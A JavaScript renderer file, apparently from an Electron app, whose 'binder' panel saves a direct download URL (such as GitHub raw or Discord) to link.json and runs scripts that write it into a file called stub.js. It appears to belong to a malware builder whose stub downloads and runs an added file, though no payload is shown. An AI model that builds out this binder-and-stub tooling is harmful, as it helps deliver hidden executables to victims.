const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

// ## SIDEBAR SELECTOR ## //
const sidebar = document.querySelector('.sidebar'); // setup sidebar
const togglebtn = document.querySelector('.toggle-btn'); // setup toggle-btn

togglebtn.addEventListener('click', () => { // defining a page's active status (active or not)
    sidebar.classList.toggle('active'); // set active
});

// Get the bind button, reset button, and input field
const bindButton = document.getElementById('bindButton');
const resetButton = document.getElementById('resetButton');
const inputField = document.querySelector('.input-section input');

// Function to validate URL
function isValidURL(string) {
    try {
        new URL(string);
        return true;
    } catch (_) {
        return false;
    }
}

// Function to save URL
function saveURL(url) {
    const jsonData = { url: url || 'none' };

    // Save URL to localStorage
    localStorage.setItem('bindFileURL', JSON.stringify(jsonData));

    // Save JSON file directly to disk
    const filePath = path.join(__dirname, 'link.json'); // Adjust path as necessary
    fs.writeFile(filePath, JSON.stringify(jsonData, null, 2), err => {
        if (err) {
            console.error('Error saving link.json:', err);
            return;
        }
        console.log('link.json has been saved!');

        // Run the replaceLink.js script to replace the placeholder in stub.js
        exec(`node ${path.join(__dirname, '..', 'binder.js')}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error executing binder.js: ${error.message}`);
                return;
            }
            if (stderr) {
                console.error(`Error output from binder.js: ${stderr}`);
                return;
            }
            console.log(stdout);
            alert('URL has been saved and stub.js has been updated with the new URL!');
        });
    });
}

// Function to delete the JSON file
function deleteJSONFile() {
    const filePath = path.join(__dirname, 'link.json'); // Adjust path as necessary
    fs.unlink(filePath, err => {
        if (err) {
            console.error('Error deleting link.json:', err);
            return;
        }
        console.log('link.json has been deleted!');

        // Run the resetLink.js script to reset stub.js
        exec(`node ${path.join(__dirname, '..', 'resetbinder.js')}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error executing resetLink.js: ${error.message}`);
                return;
            }
            if (stderr) {
                console.error(`Error output from resetLink.js: ${stderr}`);
                return;
            }
            console.log(stdout);
            alert('link.json has been deleted and stub.js has been reset to its original state!');
        });
    });
}

// Event listener for the bind button
bindButton.addEventListener('click', () => {
    const inputText = inputField.value.trim();

    if (inputText === '' || isValidURL(inputText)) {
        saveURL(inputText);
        // Clear the input field after saving
        inputField.value = '';
    } else {
        // URL is not valid
        alert('Please enter a valid URL');
    }
});

// Event listener for the reset button
resetButton.addEventListener('click', () => {
    deleteJSONFile();
    localStorage.removeItem('bindFileURL');
    // Clear the input field
    inputField.value = '';
});

// Function to populate the input field with stored URL on page load
function populateInputField() {
    const savedData = localStorage.getItem('bindFileURL');
    const savedURL = savedData ? JSON.parse(savedData).url : '';
    inputField.value = savedURL;
}

// Populate the input field with stored URL when the page loads
document.addEventListener('DOMContentLoaded', populateInputField);

// Function to display help message
function showHelpMessage() {
    alert('The binder is an option that will run the software or video image etc of your choice, you only need a direct link (when you click on the link, it downloads directly like github raw or discord).');
}

// Add event listener for the help button
document.getElementById('helpButton').addEventListener('click', showHelpMessage);
